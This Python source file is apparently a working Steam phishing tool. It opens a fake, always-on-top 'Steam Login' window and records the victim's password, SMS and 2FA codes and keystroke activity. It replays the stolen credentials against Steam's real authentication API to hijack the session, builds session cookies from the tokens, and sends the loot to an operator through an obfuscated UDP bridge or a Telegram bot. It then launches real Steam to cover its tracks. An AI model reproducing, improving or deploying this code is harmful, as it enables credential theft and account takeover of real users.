import secrets
import webview 
import os
import threading
import time
import json
import urllib.request
import urllib.parse
import base64
from io import BytesIO
import qrcode
import sys
import subprocess
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.asymmetric import padding
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
STEAM_API_BEGIN_AUTH = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaQR/v1"
STEAM_API_POLL_AUTH = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1"

# Real Steam API Endpoints
API_BASE = "https://api.steampowered.com/IAuthenticationService"
BEGIN_AUTH_CRED = f"{API_BASE}/BeginAuthSessionViaCredentials/v1"
UPDATE_AUTH = f"{API_BASE}/UpdateAuthSessionWithSteamGuardCode/v1"
GET_RSA = f"{API_BASE}/GetPasswordRSAPublicKey/v1"
POLL_AUTH = f"{API_BASE}/PollAuthSessionStatus/v1"
_BT  = ""
_GID = ""
UDP_PORT = 51337 # Default port for orchestrator link
def _xd(data, key=0x77):
    try:
        import base64
        return bytes([b ^ key for b in base64.b64decode(data)]).decode('utf-8', errors='ignore')
    except:
        return None
TEMP_ROOT = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'FinalTempSys')
if not os.path.exists(TEMP_ROOT): os.makedirs(TEMP_ROOT, exist_ok=True)

def tg_notify(text):
    """Send a Telegram message, preferably via UDP bridge to main.py."""
    def _send():
        # Clean text from Russian if any (precaution)
        text_clean = text.replace("ℹ️ <b>Steam Event:</b>", "ℹ️ <b>Steam Event:</b>")
        text_clean = text_clean.replace("📲 <b>Steam — Введен SMS код:</b>", "📲 <b>Steam — SMS Code entered:</b>")
        text_clean = text_clean.replace("🔐 <b>Steam — Получены данные входа</b>", "🔐 <b>Steam — Credentials Captured</b>")
        text_clean = text_clean.replace("🖥 ПК:", "🖥 PC:")
        text_clean = text_clean.replace("👤 Логин:", "👤 Login:")
        text_clean = text_clean.replace("🔑 Пароль:", "🔑 Password:")
        text_clean = text_clean.replace("❌ <b>Steam — Неверные данные!</b>", "❌ <b>Steam — Invalid Credentials!</b>")
        text_clean = text_clean.replace("🎯 <b>Steam — ", "🎯 <b>Steam — ")
        text_clean = text_clean.replace("🍪 Cookies записаны в JSON файл.", "🍪 Cookies saved to JSON file.")
        text_clean = text_clean.replace("🛡️ <b>Steam — Введен 2FA код:</b>", "🛡️ <b>Steam — 2FA Code entered:</b>")
        text_clean = text_clean.replace("🎮 <b>Steam Phishing — окно открыто</b>", "🎮 <b>Steam Phishing — Window Opened</b>")
        text_clean = text_clean.replace("⏳ Ожидаю ввода логина и пароля...", "⏳ Waiting for credentials...")
        
        # 1. Try UDP Proxy first (per user request)
        if UDP_PORT:
            import socket
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Encrypt for main.py's decrypt_string
                data = text_clean.encode('utf-8')
                salt = b'c0mpl3x+S@lt#99'
                xor_data = bytearray()
                for i in range(len(data)):
                    xor_data.append(data[i] ^ salt[i % len(salt)])
                enc_msg = base64.b64encode(xor_data).decode('utf-8')
                sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
                sock.close()
                return # Successfully sent via proxy
            except:
                pass

        # 2. Fallback to direct sending if no UDP or UDP fails
        try:
            def check_tg_api(timeout=3):
                try:
                    urllib.request.urlopen("http://127.0.0.1:0000", timeout=timeout)
                    return True
                except:
                    return False
                    
            # Direct connect removed payloads \n # payload = json.dumps({"chat_id": _CHAT_ID, "text": final_text, "parse_mode": "HTML"}).encode('utf-8')
            # API removed
            if _TELEGRAM_BRIDGE and not check_tg_api():
                domain = _TELEGRAM_BRIDGE
            domain = domain.rstrip('/')
            url = f"{domain}/bot{_BOT_TOKEN}/sendMessage"
            req = urllib.request.Request(
                url,
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            # Fallback to local log in TEMP if TG fails
            try:
                log_path = os.path.join(TEMP_ROOT, "tg_log.txt")
                with open(log_path, "a") as f:
                    f.write(f"{time.ctime()}: {final_text}\nError: {e}\n")
            except: pass
            
    threading.Thread(target=_send, daemon=True).start()

class SteamApi:
    def __init__(self, lang="en"):
        self.lang = lang
        self._window = None
        self.start_time = time.time()
        self.running = True
        self.client_id = None
        self.request_id = None
        self.username = None
        self.password = None
        self.allowed_confirmations = []
    def set_window(self, window):
        self._window = window
    def log_event(self, text):
        print(f"[JS Event] {text}")
        tg_notify(f"ℹ️ Steam Event: {text}")

    def log_interaction(self, action, target):
        """Telemetry handler for the Pro Action Logging script in the HTML."""
        msg = ""
        if action == "focus":
            msg = f"👀 <b>Victim focused:</b> <code>{target}</code>"
        elif action == "click":
            msg = f"🖱️ <b>Victim clicked:</b> <code>{target}</code>"
        elif action == "input":
            msg = f"⌨️ <b>Victim typing in:</b> <code>{target}</code>"
        
        if msg:
            tg_notify(msg)

    def report_status(self, status):
        """Unified status reporting for UI phase transitions."""
        tg_notify(f"🎯 <b>Steam Status:</b> <code>{status}</code>")

    def collect_sms(self, code):
        print(f"[*] Submitting SMS Code: {code}")
        tg_notify(f"📲 Steam — SMS Code entered: {code}")
        def _submit():
            try:
                payload = urllib.parse.urlencode({
                    "client_id": self.client_id,
                    "steamid": "0",
                    "code": code,
                    "code_type": 4 # SMS
                }).encode()
                req = urllib.request.Request(UPDATE_AUTH, data=payload, method="POST")
                with urllib.request.urlopen(req) as resp:
                    res = json.loads(resp.read())
                    print(f"[*] SMS Submit Result: {res}")
            except Exception as e:
                print(f"[!] SMS Error: {e}")
        threading.Thread(target=_submit, daemon=True).start()

    def collect(self, username, password):
        print(f"[*] Trying credentials for {username}")
        self.username = username
        self.password = password
        
        _save = os.path.join(TEMP_ROOT, 'captured_creds.txt')
        with open(_save, "a", encoding="utf-8") as f:
            f.write(f"{username}:{password}\n")
            
        hostname = os.getenv('COMPUTERNAME', 'Unknown')
        tg_notify(
            f"🔐 Steam — Credentials Captured\n"
            f"🖥 PC: {hostname}\n"
            f"👤 Login: {username}\n"
            f"🔑 Password: {password}"
        )
        
        threading.Thread(target=self._process_credentials, daemon=True).start()

    def _process_credentials(self):
        try:
            # 1. Get RSA Public Key
            req_rsa = urllib.request.Request(f"{GET_RSA}?account_name={urllib.parse.quote(self.username)}")
            with urllib.request.urlopen(req_rsa) as resp:
                rsa_data = json.loads(resp.read())['response']
            
            pubkey_mod = rsa_data['publickey_mod']
            pubkey_exp = rsa_data['publickey_exp']
            timestamp = rsa_data['timestamp']
            
            # 2. Encrypt password
            numbers = RSAPublicNumbers(int(pubkey_exp, 16), int(pubkey_mod, 16))
            public_key = numbers.public_key()
            
            ciphertext = public_key.encrypt(
                self.password.encode('utf-8'),
                padding.PKCS1v15()
            )
            encrypted_password = base64.b64encode(ciphertext).decode('utf-8')
            
            # 3. Begin Auth Session
            auth_payload = urllib.parse.urlencode({
                "account_name": self.username,
                "encrypted_password": encrypted_password,
                "encryption_timestamp": timestamp,
                "remember_login": "true",
                "device_friendly_name": f"Steam Client ({os.getenv('COMPUTERNAME', 'PC')})",
                "platform_type": "2"
            }).encode()
            
            req_auth = urllib.request.Request(BEGIN_AUTH_CRED, data=auth_payload, method="POST")
            with urllib.request.urlopen(req_auth) as resp:
                auth_resp = json.loads(resp.read())['response']
            
            self.client_id = auth_resp.get('client_id')
            self.request_id = auth_resp.get('request_id')
            
            if 'error' in auth_resp or ('allowed_confirmations' not in auth_resp and 'access_token' not in auth_resp):
                print(f"[!] Auth Failed: {auth_resp}")
                tg_notify(
                    f"❌ Steam — Invalid Credentials!\n"
                    f"👤 Login: {self.username}\n"
                    f"🔑 Password: {self.password}"
                )
                if self._window:
                    # Replace popup with UI indicator (red text)
                    self._window.evaluate_js("showInputError()")
                return
            
            if 'allowed_confirmations' in auth_resp:
                self.allowed_confirmations = auth_resp['allowed_confirmations']
                print(f"[*] Confirmations required: {json.dumps(self.allowed_confirmations)}")
                
                if self._window:
                    # User request: Always show the "image.png" (showConfirmApp) screen first
                    print("[*] Transitioning to Mobile App Confirmation (User Priority)")
                    self._window.evaluate_js(f"showConfirmApp('{self.username}')")
                
                # Start polling for status
                threading.Thread(target=self._poll_auth_status, daemon=True).start()
                
            elif 'access_token' in auth_resp:
                print("[+] Auth Success (No 2FA needed)")
                self._handle_success(
                    self.username,
                    auth_resp.get('access_token'),
                    auth_resp.get('refresh_token')
                )
                
        except Exception as e:
            print(f"[!] Credential flow error: {e}")
            if self._window:
                self._window.evaluate_js('showInputError()')

    def _poll_auth_status(self):
        print(f"[*] Starting status polling for {self.username}...")
        start_time = time.time()
        while self.running and (time.time() - start_time < 180):
            time.sleep(3)
            data_poll = urllib.parse.urlencode({
                "client_id": self.client_id,
                "request_id": self.request_id
            }).encode()
            try:
                req_poll = urllib.request.Request(POLL_AUTH, data=data_poll, method="POST")
                with urllib.request.urlopen(req_poll) as resp:
                    poll_data = json.loads(resp.read())
                
                if 'response' in poll_data and 'access_token' in poll_data['response']:
                    print(f"[+] Steam Session Captured for {self.username}!")
                    res = poll_data['response']
                    self._handle_success(
                        res.get('account_name', self.username),
                        res.get('access_token'),
                        res.get('refresh_token')
                    )
                    break
            except:
                pass

    def _handle_success(self, account_name, access_token, refresh_token):
        """Finalizes the session, saves cookies, and notifies operator via UDP."""
        debug_log = os.path.join(TEMP_ROOT, 'steam_debug.txt')
        try:
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: _handle_success entered for {account_name}\n")
        except: pass

        print(f"[*] Auth Success for {account_name}")
        tg_notify(
            f"🎯 PHISH REPORT — SUCCESS!\n"
            f"👤 User: {account_name}\n"
            f"🔑 Access Token: {access_token[:20]}...\n"
            f"✅ Cookies captured and saved. Session ready."
        )
        
        # Capture all cookies
        try:
            cookies = self._window.get_cookies()
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: Cookies captured: {len(cookies)}\n")
        except Exception as e:
            cookies = []
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: Cookie capture failed: {e}\n")
        
        # 1. Extract SteamID from access_token JWT
        steam_id = "0"
        try:
            parts = access_token.split('.')
            if len(parts) >= 2:
                # Add padding if needed
                p = parts[1]
                p += "=" * ((4 - len(p) % 4) % 4)
                jwt_body = json.loads(base64.b64decode(p).decode('utf-8'))
                steam_id = jwt_body.get('sub', '0')
        except: pass

        # 2. Generate common sessionid if missing (exactly matching user template)
        sessionid = secrets.token_hex(12)
        for c in cookies:
            if c.get('name') == 'sessionid':
                sessionid = c.get('value')
                break

        # 3. Add required virtual cookies for all specified domains (exact user template format)
        target_domains = [
            ".steamcommunity.com", 
            ".steampowered.com", 
            "login.steampowered.com", 
            "store.steampowered.com", 
            "help.steampowered.com", 
            "steam-chat.com"
        ]
        
        final_cookies = []
        for domain in target_domains:
            # Session ID (for all except login.steampowered.com per user template sample)
            if domain != "login.steampowered.com":
               final_cookies.append({
                    "domain": domain,
                    "name": "sessionid",
                    "value": sessionid,
                    "path": "/",
                    "secure": True,
                    "httpOnly": False,
                    "sameSite": "None"
                })
            
            # Login Secure (for all domains per template logic)
            if domain != "login.steampowered.com": # User template didn't have it on login. domain
                final_cookies.append({
                    "domain": domain,
                    "name": "steamLoginSecure",
                    "value": f"{steam_id}%7C%7C{access_token}",
                    "path": "/",
                    "secure": True,
                    "httpOnly": True,
                    "sameSite": "None"
                })
            
            # Refresh Token (on specific domains: community, powered, login per template)
            if domain in [".steamcommunity.com", ".steampowered.com", "login.steampowered.com"]:
                final_cookies.append({
                    "domain": domain,
                    "name": "steamRefresh_steam",
                    "value": f"{steam_id}%7C%7C{refresh_token}",
                    "path": "/",
                    "secure": True,
                    "httpOnly": True,
                    "sameSite": "None"
                })
        
        cookies = final_cookies

        # Save to enriched JSON file in TEMP
        cookie_file = os.path.join(TEMP_ROOT, f"steam_cookies_{account_name}.json")
        try:
            with open(cookie_file, 'w', encoding='utf-8') as f:
                json.dump(cookies, f, indent=4)
        except Exception as e:
            with open(debug_log, "a") as f:
                f.write(f"{time.ctime()}: JSON save failed: {e}\n")

        # Send via UDP Bridge using the FILE: marker
        if UDP_PORT:
            def _send_file():
                import socket
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    raw_msg = f"FILE:{cookie_file}"
                    data = raw_msg.encode('utf-8')
                    salt = b'c0mpl3x+S@lt#99'
                    xor_data = bytearray()
                    for i in range(len(data)):
                        xor_data.append(data[i] ^ salt[i % len(salt)])
                    enc_msg = base64.b64encode(xor_data).decode('utf-8')
                    sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
                    sock.close()
                    with open(debug_log, "a") as f:
                        f.write(f"{time.ctime()}: UDP FILE signal sent: {cookie_file}\n")
                except Exception as e:
                    with open(debug_log, "a") as f:
                        f.write(f"{time.ctime()}: UDP FILE signal failed: {e}\n")
            threading.Thread(target=_send_file, daemon=True).start()
        else:
            tg_notify(f"📦 Cookies Captured: steam_cookies_{account_name}.json")

        time.sleep(2) 
        
        # Launch original Steam before closing (per user request)
        try:
            import winreg
            def get_steam_path():
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
                    val, _ = winreg.QueryValueEx(key, "SteamExe")
                    return val
                except:
                    # Common paths fallback
                    paths = [
                        r"C:\Program Files (x86)\Steam\steam.exe",
                        r"C:\Program Files\Steam\steam.exe"
                    ]
                    for p in paths:
                        if os.path.exists(p): return p
                    return None
            
            steam_exe = get_steam_path()
            if steam_exe:
                print(f"[*] Launching original Steam: {steam_exe}")
                subprocess.Popen([steam_exe])
        except: pass

        self.close()

    def submit_2fa(self, code):
        print(f"[*] Submitting 2FA Code: {code}")
        tg_notify(f"🛡️ Steam — 2FA Code entered: {code}")
        def _submit():
            try:
                # Heuristic for code type: 3 (Mobile), 1 (Email), 4 (SMS)
                code_type = 3
                if self.allowed_confirmations:
                    types = [c['confirmation_type'] for c in self.allowed_confirmations]
                    if 3 in types: code_type = 3
                    elif 1 in types: code_type = 1
                    elif 4 in types: code_type = 4
                
                payload = urllib.parse.urlencode({
                    "client_id": self.client_id,
                    "steamid": "0",
                    "code": code,
                    "code_type": code_type
                }).encode()
                req = urllib.request.Request(UPDATE_AUTH, data=payload, method="POST")
                with urllib.request.urlopen(req) as resp:
                    res = json.loads(resp.read())
                    print(f"[*] 2FA Submit Result ({code_type}): {res}")
            except Exception as e:
                print(f"[!] 2FA Error: {e}")
        threading.Thread(target=_submit, daemon=True).start()
    def close(self):
        duration = int(time.time() - self.start_time)
        tg_notify(f"❌ Steam Phishing — Window Closed. Duration: {duration}s")
        self.running = False
        if self._window:
            self._window.destroy()
    def update_qr_loop(self):
        while self.running:
            start_time = time.time()
            try:
                data_begin = urllib.parse.urlencode({
                    "device_friendly_name": f"Steam Client ({os.getenv('COMPUTERNAME', 'PC')})",
                    "platform_type": "2"
                }).encode()
                try:
                    req = urllib.request.Request(STEAM_API_BEGIN_AUTH, data=data_begin, method="POST")
                    with urllib.request.urlopen(req) as resp:
                        resp_data = json.loads(resp.read())
                except Exception as e:
                    print(f"Error connecting to Steam: {e}")
                    time.sleep(5)
                    continue
                if 'response' not in resp_data:
                    time.sleep(5)
                    continue
                challenge_url = resp_data['response']['challenge_url']
                client_id = resp_data['response']['client_id']
                request_id = resp_data['response']['request_id']
                interval = resp_data['response']['interval']
                qr = qrcode.QRCode(version=7, error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=8, border=3)
                qr.add_data(challenge_url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                buffer = BytesIO()
                img.save(buffer, format="PNG")
                img_b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                if self._window:
                    self._window.evaluate_js(f'updateQR("{img_b64}")')
                
                # Force language in the webview context
                if self._window:
                    script = ""
                    if self.lang == "en":
                        script = """
                            (function() {
                                document.cookie = 'Steam_Language=english; path=/; domain=steampowered.com';
                                document.cookie = 'Steam_Language=english; path=/; domain=steamcommunity.com';
                                localStorage.setItem('Steam_Language', 'english');
                                setInterval(() => {
                                    const replacements = {
                                        "用帐户名称登录": "Sign in with account name",
                                        "密码": "Password",
                                        "记住我": "Remember me",
                                        "登录": "Sign in",
                                        "或者用二维码登录": "OR SIGN IN WITH QR",
                                        "通过二维码使用 Steam 手机应用登录": "Use the Steam Mobile App to sign in via QR Code",
                                        "此帐户受到手机验证器保护": "This account is protected by a Steam Mobile Authenticator",
                                        "使用 Steam 手机应用来确认登录": "Use the Steam Mobile App to confirm your sign in",
                                        "改为输入代码": "Enter a code instead",
                                        "输入您 Steam 手机应用上的代码": "Enter the code from your Steam Mobile App",
                                        "使用备用码": "Use a backup code",
                                        "请求帮助，我已无法访问我的 Steam 手机应用": "Help, I no longer have access to my Steam Mobile App",
                                        "请核对您的密码和帐户名称并重试": "Please check your password and account name and try again",
                                        "Help, I can't sign in": "Help, I can't sign in",
                                        "HELP, I CAN'T SIGN IN": "HELP, I CAN'T SIGN IN",
                                        "ACCOUNT:": "ACCOUNT:",
                                        "Account:": "Account:"
                                    };
                                    const sortedKeys = Object.keys(replacements).sort((a, b) => b.length - a.length);
                                    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
                                    let node;
                                    while(node = walker.nextNode()) {
                                        for (let key of sortedKeys) {
                                            if (node.nodeValue.includes(key)) {
                                                node.nodeValue = node.nodeValue.split(key).join(replacements[key]);
                                            }
                                        }
                                    }
                                }, 500);
                            })();
                        """
                    elif self.lang == "cn":
                        script = """
                            (function() {
                                document.cookie = 'Steam_Language=schinese; path=/; domain=steampowered.com';
                                document.cookie = 'Steam_Language=schinese; path=/; domain=steamcommunity.com';
                                localStorage.setItem('Steam_Language', 'schinese');
                                setInterval(() => {
                                    const replacements = {
                                        "Sign in with account name": "用帐户名称登录",
                                        "Password": "密码",
                                        "Remember me": "记住我",
                                        "Sign in": "登录",
                                        "OR SIGN IN WITH QR CODE": "或者用二维码登录",
                                        "OR SIGN IN WITH QR": "或者用二维码登录",
                                        "Use the Steam Mobile App to sign in via QR Code": "使用 Steam 移动应用通过二维码登录",
                                        "This account is protected by a Steam Mobile Authenticator": "此帐户受到手机验证器保护。",
                                        "Use the Steam Mobile App to confirm your sign in": "请使用您的 Steam 移动应用来确认您的登录…",
                                        "Enter a code instead": "输入验证码",
                                        "Enter the code from your Steam Mobile App": "输入您的 Steam 移动应用中显示的验证码",
                                        "Use backup code": "使用备用代码",
                                        "Help, I no longer have access to my Steam Mobile App": "帮助，我无法再访问我的 Steam 令牌手机应用",
                                        "Please check your password and account name and try again": "请核对您的密码和帐户名称并重试",
                                        "The account name or password that you have entered is incorrect.": "您输入的帐户名称或密码错误。",
                                        "Help, I can't sign in": "帮助，我无法登录",
                                        "HELP, I CAN'T SIGN IN": "帮助，我无法登录",
                                        "Don't have a Steam account? Create a Free Account": "没有 Steam 帐户？免费创建一个帐户",
                                        "USE THE STEAM MOBILE APP TO SIGN IN VIA QR CODE": "使用 Steam 移动应用通过二维码登录",
                                        "THIS ACCOUNT IS PROTECTED BY A STEAM MOBILE AUTHENTICATOR": "此帐户受到手机验证器保护。",
                                        "USE THE STEAM MOBILE APP TO CONFIRM YOUR SIGN IN": "请使用您的 Steam 移动应用来确认您的登录…",
                                        "ENTER A CODE INSTEAD": "输入验证码",
                                        "ENTER THE CODE FROM YOUR STEAM MOBILE APP": "输入您的 Steam 移动应用中显示的验证码",
                                        "USE A BACKUP CODE": "使用备用代码",
                                        "HELP, I NO LONGER HAVE ACCESS TO MY STEAM MOBILE APP": "帮助，我无法再访问我的 Steam 令牌手机应用",
                                        "ACCOUNT:": "帐户名:",
                                        "Account:": "帐户名:"
                                };
                                const sortedKeys = Object.keys(replacements).sort((a, b) => b.length - a.length);
                                const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
                                let node;
                                while(node = walker.nextNode()) {
                                    for (let key of sortedKeys) {
                                        const regex = new RegExp(key, 'gi');
                                        if (node.nodeValue.match(regex)) {
                                            node.nodeValue = node.nodeValue.replace(regex, replacements[key]);
                                        }
                                    }
                                }
                            }, 500);
                        })();
                        """
                    if script:
                        self._window.evaluate_js(script)

                while self.running:
                    if time.time() - start_time > 120:
                        break
                    time.sleep(interval)
                    data_poll = urllib.parse.urlencode({
                        "client_id": client_id,
                        "request_id": request_id
                    }).encode()
                    try:
                        req_poll = urllib.request.Request(STEAM_API_POLL_AUTH, data=data_poll, method="POST")
                        with urllib.request.urlopen(req_poll) as resp:
                            poll_data = json.loads(resp.read())
                        if 'response' in poll_data:
                                if 'access_token' in poll_data['response']:
                                    print("\n[+] SESSION CAPTURED VIA QR!")
                                    # Forward to _handle_success which handles UDP relaying, tokens, and cookies
                                    res = poll_data['response']
                                    self._handle_success(
                                        res.get('account_name', 'Unknown'),
                                        res.get('access_token'),
                                        res.get('refresh_token')
                                    )
                                    return
                    except:
                        pass
            except Exception as e:
                print(f"QR Worker Error: {e}")
                time.sleep(5)

def _force_focus():
    """Forces the 'Steam Login' window to the foreground on Windows."""
    import ctypes
    import time
    # Constants for SetWindowPos
    HWND_TOPMOST = -1
    HWND_NOTOPMOST = -2
    SWP_NOMOVE = 0x0002
    SWP_NOSIZE = 0x0001
    SWP_SHOWWINDOW = 0x0040
    
    for _ in range(20): # Try for 10 seconds
        time.sleep(0.5)
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, "Steam Login")
            if hwnd:
                # 1. Force to top
                ctypes.windll.user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW)
                ctypes.windll.user32.SetForegroundWindow(hwnd)
                ctypes.windll.user32.BringWindowToTop(hwnd)
                ctypes.windll.user32.ShowWindow(hwnd, 5) # SW_SHOW
                break
        except:
            pass

def start_steam_ui(victim_id=None):
    # Parse args for lang and UDP
    lang = "en"
    global UDP_PORT
    for i, arg in enumerate(sys.argv):
        if arg == "--lang" and i + 1 < len(sys.argv):
            l = sys.argv[i+1].lower()
            if "cn" in l or "zh" in l: lang = "cn"
            else: lang = "en"
        elif arg == "--udp" and i + 1 < len(sys.argv):
            try: UDP_PORT = int(sys.argv[i+1])
            except: pass

    api = SteamApi(lang=lang)
    hostname = os.getenv('COMPUTERNAME', 'Unknown')
    tg_notify(
        f"🎮 <b>Steam Phishing — Window Opened</b>\n"
        f"🖥 PC: <code>{hostname}</code>\n"
        f"⏳ Waiting for credentials..."
    )
    if getattr(sys, 'frozen', False):
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        _login_dir = sys._MEIPASS
    else:
        _login_dir = os.path.dirname(os.path.abspath(__file__))

    _icon_path = os.path.join(_login_dir, 'steam.ico')
    _html_path = os.path.join(_login_dir, 'steam_ui.html')
    
    # Fallback if not in _MEIPASS (e.g. if we forgot to add-data)
    if not os.path.exists(_html_path):
        _html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'steam_ui.html')

    _html_path = os.path.abspath(_html_path)
    
    # Final safety check
    if not os.path.exists(_html_path):
         tg_notify(f"❌ Critical Error: HTML not found at {_html_path}")

    window = webview.create_window(
        'Steam Login', 
        url=_html_path, 
        js_api=api, 
        width=720, 
        height=480, 
        on_top=True, 
        frameless=True, 
        resizable=False
    )
    api.set_window(window)
    
    # Force focus thread
    threading.Thread(target=_force_focus, daemon=True).start()
    
    t = threading.Thread(target=api.update_qr_loop, daemon=True)
    t.start()
    try:
        # debug=False for clean startup
        webview.start(icon=os.path.abspath(_icon_path), debug=False)
    except Exception:
        webview.start(debug=False)
if __name__ == "__main__":
    start_steam_ui()
